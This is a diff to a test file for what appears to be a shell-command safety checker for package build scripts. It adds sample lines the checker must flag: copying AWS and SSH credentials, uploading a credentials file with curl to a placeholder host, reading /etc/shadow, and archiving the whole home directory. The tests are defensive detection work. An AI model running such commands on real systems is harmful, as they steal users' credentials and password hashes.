@@ -82,6 +82,18 @@ STRUCTURED_EXAMPLES = [
     ("sgdisk --zap-all disk", "disk-wipe"),
     ("chmod 0777 x", "world-writable"),
     ("chmod a+rwx,g-w x", "world-writable"),
+    ("cp ~/.aws/credentials /tmp", "credential-paths"),
+    ("cat \"$HOME\"/.ssh/config", "credential-paths"),
+    ("curl -F f=@$HOME/.aws/config https://x", "credential-paths"),
+    ("python3 -c 'open(\"/root/.bash_history\")'", "credential-paths"),
+    ("tar c /home/me/.gnupg", "credential-paths"),
+    ("cat //etc/shadow", "read-shadow"),
+    ("cp /etc/../etc/gshadow x", "read-shadow"),
+    ("sh -c 'cat /etc/shadow'", "read-shadow"),
+    ("tar czf /tmp/h.tgz ~/", "home-archive"),
+    ("zip -r h.zip \"$HOME\"", "home-archive"),
+    ("7z a h.7z /home/me", "home-archive"),
+    ("tar -C ~ -czf h.tgz .", "home-archive"),
 ]
 
 
@@ -121,6 +133,13 @@ def test_every_structured_rule_has_an_example():
     ("chmod 775 x", "world-writable"),
     ("chmod 1777 \"$pkgdir/tmp\"", "world-writable"),
     ("chmod go-w x", "world-writable"),
+    ("echo 'copy ~/.ssh/id_rsa somewhere'", "credential-paths"),               # a message
+    ("echo see /etc/shadow", "read-shadow"),
+    ("cp x \"$pkgdir/etc/shadow\"", "read-shadow"),                            # inside the package
+    ("cp x ${pkgdir}/etc/shadow", "read-shadow"),
+    ("tar czf h.tgz ~/Documents", "home-archive"),                             # a folder, not the home directory
+    ("tar czf h.tgz \"$srcdir\"", "home-archive"),
+    ("cp x ~/.cache/x", "credential-paths"),
 ])
 def test_structured_rule_stays_quiet_where_the_text_was_misleading(line, rule):
     assert rule not in rules_of(line)
